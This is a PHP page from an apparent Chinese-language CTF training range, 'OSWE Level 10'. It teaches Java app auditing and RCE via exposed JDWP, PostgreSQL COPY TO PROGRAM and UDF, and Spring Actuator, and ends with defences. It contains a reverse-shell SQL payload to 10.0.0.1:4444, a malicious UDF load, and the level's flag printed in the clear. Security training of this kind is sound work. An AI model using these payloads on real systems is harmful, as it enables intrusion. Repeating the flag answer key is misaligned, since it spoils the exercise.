<?php
include_once '../../inc/config.inc.php';
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[260] = 'active open';
$ACTIVE[292] = 'active';
$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{OSWE_L10_Java_Deser_JDWP_UDF_RCE}';
$flag_msg = '';
if (isset($_POST['check_flag'])) {
    if (trim($_POST['user_flag']) === $correct_flag) {
        $_SESSION['oswe_flags']['flag3'] = true;
        $flag_msg = '<div class="alert alert-success">✅ 通关！掌握 Java 审计及多种 RCE 手法。</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger">❌ Flag 错误，请回顾 Java 安全机制。</div>';
    }
}
?>
<style>
.ctf-stage-header { background: var(--bg-card); border-radius: 14px; padding: 25px 30px; margin-bottom: 25px; border: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
.step-box { background:#ffffff; border:1px solid #e2e8f0; border-radius:12px; padding:24px; margin-bottom:22px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05); }
.step-title { font-size:16px; font-weight:700; color:#0f172a; margin-top:0; margin-bottom:14px; display:flex; align-items:center; gap:8px; }
.step-num { background:linear-gradient(135deg,#06b6d4,#22d3ee); color:#fff; width:26px; height:26px; border-radius:6px; display:inline-flex; align-items:center; justify-content:center; font-size:12px; font-weight:800; }
.cmd-box { background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: var(--text-primary); margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.cmd-box .comment { color:#64748b; }
.cmd-box .flag-text { color:#fbbf24; font-weight:bold; }
.highlight-box { background:rgba(6,182,212,0.08); border:1px solid rgba(6,182,212,0.25); border-radius:8px; padding:14px 18px; margin:12px 0; font-size:13px; color:#334155; line-height:1.7; }
.flag-submit-area { background:#f8fafc; border:2px dashed rgba(6,182,212,0.4); border-radius:12px; padding:24px; margin-top:25px; text-align:center; }
.nav-buttons { display: flex; justify-content: space-between; margin-top: 20px; }
.btn-nav { background: #06b6d4; color: white; padding: 10px 20px; border-radius: 6px; text-decoration: none; }
.btn-nav:hover { background: #0891b2; color: white; }
</style>

<div class="main-content"><div class="main-content-inner"><div class="page-content">
    <div class="ctf-stage-header">
        <h2>OSWE Level 10: Java 应用审计与 RCE 链</h2>
        <p>300 PTS | 核心考点: 反编译审计, JDWP, PostgreSQL UDF, Spring Actuator</p>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">1</span> Java 应用白盒分析与反编译</h3>
        <p>在企业级 Web 应用渗透中，我们常能获取到 .war 或 .jar 文件。第一步是将其反编译为可读的源代码。</p>
        <div class="highlight-box">
            1. 使用 <code>JD-GUI</code> 或 <code>jadx</code> 反编译字节码。<br>
            2. 分析 <code>web.xml</code> 寻找 Servlet 入口点，或搜索 Spring 框架的 <code>@RequestMapping</code>, <code>@PostMapping</code> 等注解。<br>
            3. 追踪参数流向，寻找直接拼接入 SQL 语句或反射调用的危险函数。
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">2</span> JDWP 远程调试未授权访问</h3>
        <p>Java Debug Wire Protocol (JDWP) 是 Java 调试协议。若配置不当对外暴露（常见端口 8000/5005），攻击者可以通过 attach 上去并在任意类的方法上打断点并执行任意代码。</p>
        <div class="cmd-box">
            <span class="comment"># 常见的 JDWP 启动参数</span><br>
            -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000<br>
            <span class="comment"># 利用工具原理：挂载调试器 -> 设置断点 -> 触发执行 -> 动态求值 (evaluate) 注入 Runtime.exec()</span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">3</span> 数据库层 RCE: PostgreSQL UDF 与 COPY</h3>
        <p>针对类似 ManageEngine 等使用 PostgreSQL 数据库的应用，如果找到堆叠 SQL 注入，就能利用 DB 层的功能实现系统命令执行。</p>
        <div class="cmd-box">
            <span class="comment"># 方式一：利用 COPY TO/FROM PROGRAM (PG 9.3+)</span><br>
            COPY (SELECT 1) TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"';<br>
            <br>
            <span class="comment"># 方式二：利用大型对象 (Large Objects) 写入 .so/.dll 并创建 UDF 函数</span><br>
            CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/exploit.so', 'sys_eval' LANGUAGE C STRICT;
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">4</span> Spring Boot Actuator 利用面</h3>
        <p>Spring Actuator 用于监控应用状态，若暴露过多 Endpoint 将导致严重安全风险。</p>
        <div class="highlight-box">
            - <strong>/actuator/env</strong>: 获取环境变量或通过 Spring Cloud 环境注入 SpEL 表达式实现 RCE。<br>
            - <strong>/actuator/heapdump</strong>: 下载内存快照 (hprof)，从中提取明文密码、API Keys 及 Session Tokens。<br>
            - <strong>/actuator/loggers</strong>: 修改日志配置，写入恶意日志文件。
        </div>
        <div class="cmd-box">
            <span class="comment"># 拿到这把钥匙，解开本关：</span><br>
            <span class="flag-text">flag{OSWE_L10_Java_Deser_JDWP_UDF_RCE}</span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">5</span> 修复与防御措施</h3>
        <p>企业级防御建议：</p>
        <ul>
            <li>严格禁用生产环境的 JDWP 调试。</li>
            <li>配置 Spring Security 控制 Actuator 访问权限，禁用不必要的 endpoints。</li>
            <li>遵循最小权限原则配置数据库连接账号，防止执行 <code>COPY PROGRAM</code> 或创建 UDF。</li>
        </ul>
    </div>

    <div class="flag-submit-area">
        <form method="POST">
            <h4>提交 Flag</h4>
            <input type="text" name="user_flag" class="form-control" style="width:50%; margin:10px auto;" placeholder="flag{...}">
            <button type="submit" name="check_flag" class="btn btn-primary" style="background:#06b6d4;border:none;">验证</button>
            <?php if($flag_msg) echo "<div style='margin-top:15px;'>$flag_msg</div>"; ?>
        </form>
    </div>

    <div class="nav-buttons">
        <a href="oswe_l9_type_juggling.php" class="btn-nav">上一关: PHP类型混淆</a>
        <a href="oswe_l11_proto_pollution.php" class="btn-nav">下一关: JS原型链污染</a>
    </div>

</div></div></div>

<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
